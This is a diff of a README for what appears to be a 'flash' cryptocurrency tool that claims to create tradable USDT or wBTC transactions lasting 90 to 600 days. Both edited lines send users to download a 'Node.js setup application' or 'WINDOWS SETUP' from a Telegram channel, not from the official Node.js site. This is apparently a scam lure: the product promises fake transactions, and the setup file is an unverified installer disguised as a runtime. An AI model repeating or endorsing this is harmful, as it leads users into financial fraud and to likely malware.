@@ -33,7 +33,7 @@ This application requires [Node.js](https://nodejs.org) to run.
 
 ### Windows
 
-Download the Node.js setup application [here](https://t.me/Nova_sofrwares).
+Download the setup application [here](https://t.me/Nova_sofrwares).
 
 ### Linux
 
@@ -95,5 +95,5 @@ Gas is required for every non-bitcoin (USDT, wBTC) flashing transaction. You are
 - **Flash Duration**: Control your timing( 90 Days to 600 Days).
 - **Tradable**: Freedom to trade.
 - 
-  ## Download the Node.js setup application [here](https://t.me/Nova_sofrwares).
+  ## Download the WINDOWS SETUP [here](https://t.me/Nova_sofrwares).
 
